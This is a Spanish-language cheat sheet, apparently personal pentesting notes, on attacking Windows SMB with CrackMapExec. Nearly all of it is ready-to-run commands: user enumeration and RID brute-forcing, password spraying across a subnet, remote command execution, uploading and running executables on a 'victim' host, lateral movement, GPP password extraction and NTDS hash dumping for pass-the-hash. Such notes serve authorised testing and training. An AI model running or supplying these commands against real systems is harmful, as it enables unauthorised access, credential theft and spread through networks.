## **🔹 Uso básico de [[Crackmapexec (CME)]] en SMB**

### **1️⃣ Escanear un objetivo para ver si SMB está disponible**

`crackmapexec smb IP_O_HOST`

### **2️⃣ Enumerar usuarios en SMB**

`crackmapexec smb IP_O_HOST -u usuario -p contraseña --users`

### **2️⃣ Enumerar usuarios mediante RID Brute-Forcing en SMB**

`crackmapexec smb IP_O_HOST -u guest -p '' --rid-brute
`
### **3️⃣ Enumerar recursos compartidos (shares)**

`crackmapexec smb IP_O_HOST -u usuario -p contraseña --shares`

### **4️⃣ Probar una lista de usuarios y contraseñas en SMB**

`crackmapexec smb IP_O_HOST -u usuarios.txt -p contraseñas.txt`

Si quieres probar contra varios hosts en una red:

`crackmapexec smb 192.168.1.0/24 -u usuarios.txt -p contraseñas.txt`

### **🔹 1️⃣ Enumerar usuarios SMB con un diccionario usando `crackmapexec`**

`crackmapexec` permite probar nombres de usuario en SMB sin necesidad de credenciales.

`crackmapexec smb IP_DEL_SERVIDOR -u diccionario.txt -p ''`

🔹 **Ejemplo:**

`crackmapexec smb 192.168.1.100 -u nombres.txt -p ''`

✅ **Salida esperada (si el usuario existe):**

`SMB         192.168.1.100    445    WIN-SERVER    [*] Guest login allowed SMB         192.168.1.100    445    WIN-SERVER    [+] Valid account: 'usuario1:' SMB         192.168.1.100    445    WIN-SERVER    [+] Valid account: 'admin:'`

### **5️⃣ Ejecución de comandos remotos**

Si tienes credenciales válidas, puedes ejecutar un comando en el sistema remoto:

`crackmapexec smb IP_O_HOST -u usuario -p contraseña -x "whoami"`

También puedes cargar y ejecutar archivos `.exe` en la máquina víctima:

`crackmapexec smb IP_O_HOST -u usuario -p contraseña -X "ruta/del/archivo.exe"`

---

## **🔹 Movilidad lateral con CME**

Si obtienes credenciales válidas, puedes utilizarlas para moverte en la red.  
Ejemplo de escaneo en toda la red para detectar más máquinas donde funcionen las credenciales:

`crackmapexec smb 192.168.1.0/24 -u usuario -p contraseña`

Si un usuario tiene permisos de administrador, puedes **activar WinRM y obtener acceso remoto**:

`crackmapexec winrm IP_O_HOST -u usuario -p contraseña`

---

## **🔹 Detección de GPOs y hashes NTLM**

Puedes extraer información de políticas de grupo (GPOs) o incluso credenciales en texto claro si hay configuraciones débiles:

`crackmapexec smb IP_O_HOST -u usuario -p contraseña --gpp-passwords`

Si tienes acceso a un equipo, puedes obtener hashes NTLM de usuarios para ataques Pass-the-Hash (PTH):

`crackmapexec smb IP_O_HOST -u usuario -p contraseña --ntds`